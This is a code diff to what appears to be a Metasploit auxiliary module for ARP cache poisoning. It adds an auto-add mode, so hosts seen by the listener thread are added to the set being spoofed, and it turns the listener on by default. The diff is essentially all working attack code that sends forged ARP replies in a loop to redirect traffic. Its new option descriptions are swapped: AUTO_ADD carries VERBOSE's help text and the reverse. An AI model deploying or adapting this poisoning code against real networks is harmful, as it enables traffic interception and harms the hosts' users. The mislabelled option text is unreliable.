@@ -43,23 +43,35 @@ class Metasploit3 < Msf::Auxiliary
 			OptString.new('DHOSTS',  	[true, 'Target ip addresses']),
 			OptString.new('INTERFACE', 	[false, 'The name of the interface']),
 			OptBool.new(  'BIDIRECTIONAL',	[true, 'Spoof also the source with the dest',false]),
-			OptBool.new(  'VERBOSE',	[true, 'Display more output on screen',false]),
-			OptBool.new(  'LISTENER',    	[true, 'Use an additionnal thread that will listen to arp request and try to relply as fast as possible', false]),
-			# This mode will generate address ip conflict pop up  on most systems
-			OptBool.new(  'BROADCAST',    	[true, 'If set, the module will send replies on the broadcast address witout consideration of DHOSTS', false])
+			OptBool.new(  'AUTO_ADD',	[true, 'Display more output on screen',false]),
+			OptBool.new(  'VERBOSE',	[true, 'Auto add new host when discovered by the listener',false]),
+			OptBool.new(  'LISTENER',    	[true, 'Use an additionnal thread that will listen to arp request and try to relply as fast as possible', true])
 		], self.class)
 
 		register_advanced_options([
 			OptString.new('LOCALSMAC',    	[false, 'The MAC address of the local interface to use for hosts detection']),
 			OptString.new('LOCALSIP',    	[false, 'The IP address of the local interface to use for hosts detection']),
 			OptInt.new(   'PKT_DELAY',    	[true, 'The delay in milliseconds between each packet during poisoning', 100]),
-			OptInt.new('TIMEOUT', [true, 'The number of seconds to wait for new data', 2])
+			OptInt.new('TIMEOUT', [true, 'The number of seconds to wait for new data during host detection', 2]),
+			# This mode will generate address ip conflict pop up  on most systems
+			OptBool.new(  'BROADCAST',    	[true, 'If set, the module will send replies on the broadcast address witout consideration of DHOSTS', false])
 		], self.class)
 
 		deregister_options('SNAPLEN', 'FILTER', 'PCAPFILE','RHOST','UDP_SECRET','GATEWAY','NETMASK')
 	end
 
 	def run
+		# The local dst (and src) cache(s)
+		@dsthosts_cache = {}
+		@srchosts_cache = {}
+		# Some additional caches for autoadd feature
+		if datastore['AUTO_ADD']
+			@dsthosts_autoadd_cache = {}
+			if datastore['BIDIRECTIONAL']
+				@srchosts_autoadd_cache = {}
+			end
+		end
+
 		begin
 			open_pcap({'SNAPLEN' => 68, 'FILTER' => "arp[6:2] == 0x0002"})
 			@interface = datastore['INTERFACE'] || Pcap.lookupdev
@@ -102,10 +114,6 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def arp_poisoning
-		# The local dst (and src) cache(s)
-		dsthosts_cache = {}
-		srchosts_cache = {}
-
 		lsmac = datastore['LOCALSMAC'] || @smac
 		raise RuntimeError ,'Local Source Mac is not in correct format' unless is_mac?(lsmac)
 
@@ -116,12 +124,12 @@ class Metasploit3 < Msf::Auxiliary
 		raise "LOCALIP is not an ipv4 address" unless is_ipv4? sip
 
 		dhosts_range = Rex::Socket::RangeWalker.new(datastore['DHOSTS'])
-		dhosts = []
-		dhosts_range.each{|dhost| if is_ipv4? dhost then dhosts.push(dhost) end} 
+		@dhosts = []
+		dhosts_range.each{|dhost| if is_ipv4? dhost then @dhosts.push(dhost) end} 
 
 		#Build the local dest hosts cache
 		print_status("Building the destination hosts cache...")
-		dhosts.each do |dhost|
+		@dhosts.each do |dhost|
 			if datastore['VERBOSE']
 				print_status("Sending arp packet to #{dhost}")
 			end
@@ -130,10 +138,10 @@ class Metasploit3 < Msf::Auxiliary
 			while(reply = getreply())
 				next if not reply[:arp]
 				#Without this check any arp request would be added to the cache
-				if dhosts.include? reply[:arp].spa
+				if @dhosts.include? reply[:arp].spa
 					print_status("#{reply[:arp].spa} appears to be up.") 
 					report_host(:host => reply[:arp].spa, :mac=>reply[:arp].sha)
-					dsthosts_cache[reply[:arp].spa] = reply[:arp].sha
+					@dsthosts_cache[reply[:arp].spa] = reply[:arp].sha
 				end
 			end
 			
@@ -143,25 +151,25 @@ class Metasploit3 < Msf::Auxiliary
 		while (Time.now.to_f < etime)
 			while(reply = getreply())
 				next if not reply[:arp]
-				if dhosts.include? reply[:arp].spa
+				if @dhosts.include? reply[:arp].spa
 					print_status("#{reply[:arp].spa} appears to be up.")  
 					report_host(:host => reply[:arp].spa, :mac=>reply[:arp].sha)
-					dsthosts_cache[reply[:arp].spa] = reply[:arp].sha
+					@dsthosts_cache[reply[:arp].spa] = reply[:arp].sha
 				end
 			end
 			Kernel.select(nil, nil, nil, 0.50)
 		end
-		raise RuntimeError, "No hosts found" unless dsthosts_cache.length > 0
+		raise RuntimeError, "No hosts found" unless @dsthosts_cache.length > 0
 
 		#Build the local src hosts cache
 		if datastore['BIDIRECTIONAL']
 			print_status("Building the source hosts cache for unknow source hosts...")
 			@shosts.each do |shost|
-				if dsthosts_cache.has_key? shost
+				if @dsthosts_cache.has_key? shost
 					if datastore['VERBOSE']
 						print_status("Adding #{shost} from destination cache")
 					end		
-					srchosts_cache[shost] = dsthosts_cache[shost]
+					@srchosts_cache[shost] = @dsthosts_cache[shost]
 					next
 				end
 				if datastore['VERBOSE']
@@ -174,7 +182,7 @@ class Metasploit3 < Msf::Auxiliary
 					if @shosts.include? reply[:arp].spa
 						print_status("#{reply[:arp].spa} appears to be up.") 
 						report_host(:host => reply[:arp].spa, :mac=>reply[:arp].sha)
-						srchosts_cache[reply[:arp].spa] = reply[:arp].sha
+						@srchosts_cache[reply[:arp].spa] = reply[:arp].sha
 					end
 				end
 			
@@ -187,24 +195,44 @@ class Metasploit3 < Msf::Auxiliary
 					if @shosts.include? reply[:arp].spa
 						print_status("#{reply[:arp].spa} appears to be up.")  
 						report_host(:host => reply[:arp].spa, :mac=>reply[:arp].sha)
-						srchosts_cache[reply[:arp].spa] = reply[:arp].sha
+						@srchosts_cache[reply[:arp].spa] = reply[:arp].sha
 					end
 				end
 				Kernel.select(nil, nil, nil, 0.50)
 			end
-			raise RuntimeError, "No hosts found" unless srchosts_cache.length > 0
+			raise RuntimeError, "No hosts found" unless @srchosts_cache.length > 0
+		end
+
+		if datastore['AUTO_ADD']
+			@mutex_cache = Mutex.new
 		end
 
 		#Start the listener
 		if datastore['LISTENER']
-			start_listener(dsthosts_cache, srchosts_cache)
+			start_listener(@dsthosts_cache, @srchosts_cache)
 		end
 		#Do the job until user interupt it
 		print_status("ARP poisonning in progress...")
 		while(true)
-			dsthosts_cache.each do |dhost, dmac|
+			if datastore['AUTO_ADD']
+				@mutex_cache.lock			
+				if @dsthosts_autoadd_cache.length > 0
+					@dsthosts_cache.merge!(@dsthosts_autoadd_cache)
+					@dsthosts_autoadd_cache = {}
+				end
 				if datastore['BIDIRECTIONAL']
-					srchosts_cache.each do |shost,smac|
+					if @srchosts_autoadd_cache.length > 0
+						@srchosts_cache.merge!(@srchosts_autoadd_cache)
+						@srchosts_autoadd_cache = {}
+					end
+				end
+				@mutex_cache.unlock
+			end
+			@dsthosts_cache.keys.sort.each do |dhost|
+				dmac = @dsthosts_cache[dhost] 
+				if datastore['BIDIRECTIONAL']
+					@srchosts_cache.keys.sort.each do |shost|
+						smac = @srchosts_cache[shost] 
 						if shost != dhost
 							print_status("Sending arp packet for #{shost} to #{dhost}") if datastore['VERBOSE']
 							reply = buildreply(shost, @smac, dhost, dmac)
@@ -225,8 +253,10 @@ class Metasploit3 < Msf::Auxiliary
 			end
 
 			if datastore['BIDIRECTIONAL']
-				srchosts_cache.each do |shost, smac|
-					dsthosts_cache.each do |dhost,dmac|
+				@srchosts_cache.keys.sort.each do |shost|
+					smac = @srchosts_cache[shost]
+					@dsthosts_cache.keys.sort.each do |dhost|
+						dmac = @dsthosts_cache[dhost] 
 						if shost != dhost
 							print_status("Sending arp packet for #{dhost} to #{shost}") if datastore['VERBOSE']
 							reply = buildreply(dhost, @smac, shost, smac)
@@ -236,7 +266,6 @@ class Metasploit3 < Msf::Auxiliary
 					end
 				end
 			end
-
 		end
 	end
 
@@ -331,6 +360,22 @@ class Metasploit3 < Msf::Auxiliary
 									print_status("Listener : Request from #{arp.spa} for #{arp.tpa}") if datastore['VERBOSE']
 									reply = buildreply(arp.tpa, @smac, arp.spa, arp.sha)
 									3.times{listener_capture.inject(reply)}
+								elsif datastore['AUTO_ADD']
+									if (@dhosts.include? arp.spa and not liste_dst_ips.include? arp.spa
+										)
+										@mutex_cache.lock
+										print_status("#{arp.spa} appears to be up.") 
+										@dsthosts_autoadd_cache[arp.spa] = arp.sha
+										liste_dst_ips.push arp.spa
+										@mutex_cache.unlock
+									elsif (args[:BIDIRECTIONAL] and @shosts.include? arp.spa and 
+										not liste_src_ips.include? arp.spa)
+										@mutex_cache.lock
+										print_status("#{arp.spa} appears to be up.") 
+										@srchosts_autoadd_cache[arp.spa] = arp.sha
+										liste_src_ips.push arp.spa
+										@mutex_cache.unlock
+									end			
 								end
 							end
 						end
@@ -342,7 +387,6 @@ class Metasploit3 < Msf::Auxiliary
 			end
 		end
 		@listener.abort_on_exception = true
-		#@listener.join
 	end
 
 end
